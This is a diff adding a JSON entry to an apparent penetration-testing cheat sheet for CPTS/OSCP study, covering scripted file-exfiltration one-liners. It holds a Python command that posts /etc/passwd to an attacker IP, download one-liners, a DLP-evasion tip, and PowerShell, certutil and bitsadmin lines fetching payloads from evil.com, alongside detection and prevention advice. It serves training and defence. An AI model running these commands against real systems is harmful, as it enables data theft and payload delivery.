@@ -1,0 +1,95 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "python",
+    "perl"
+  ],
+  "tags": [
+    "code",
+    "upload",
+    "one-liner"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Code One-liners",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "POST /etc/passwd to your upload server",
+      "command": "python3 -c 'import requests;requests.post(\"http://10.10.14.12:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'"
+    }
+  ],
+  "notes": "Interpreter one-liners also exfil: python http.server upload, php/ruby POST, or pipe to an attacker listener. Use when dedicated upload tools aren't installed.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "code-download-oneliners",
+      "rel": "alternative",
+      "note": "Same languages for ingress."
+    },
+    {
+      "id": "gs-bind-shells",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "code-upload-oneliners",
+  "name": "Transfer with Code - Upload / Read One-liners",
+  "command": "python3 -c 'import requests;requests.post(\"http://<ip>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
+  "description": "Push files out or read a served file with a scripting one-liner - pairs with a Python uploadserver or http.server.",
+  "variations": [
+    {
+      "label": "Python upload (requests)",
+      "command": "python3 -c 'import requests;requests.post(\"http://<lhost>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'"
+    },
+    {
+      "label": "Python read a served file",
+      "command": "python3 -c \"import urllib.request;print(urllib.request.urlopen('http://<ip>/flag.txt').read().decode())\""
+    },
+    {
+      "label": "Perl download (HTTP::Tiny)",
+      "command": "perl -e 'use HTTP::Tiny; my $r=HTTP::Tiny->new->get(\"http://<ip>:8000/test.txt\"); open(F,\">perl_test.txt\"); print F $r->{content}; close(F);'"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1048.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Scripting one-liners also upload data off a host (python SimpleHTTPServer POST, php, ruby) for exfil when dedicated tools are unavailable.",
+    "prerequisites": "Code execution, an interpreter present, data to exfil, and an attacker endpoint reachable.",
+    "impact": "Loot exfiltrated via a scripting interpreter over a non-C2 channel.",
+    "detection": "Interpreter making an unusual outbound connection with data; auditd command line; DLP/egress monitoring on the content.",
+    "artifacts": "Interpreter process with an outbound POST; DLP hits; the source process's network connection.",
+    "prevention": "[MITRE T1048 M1037] Egress filtering + DLP; restrict internet-reachable hosts; monitor interpreter network activity.",
+    "evasion": "Encrypt/compress the data and exfil over HTTPS to blend and defeat DLP signatures.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1048.003"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
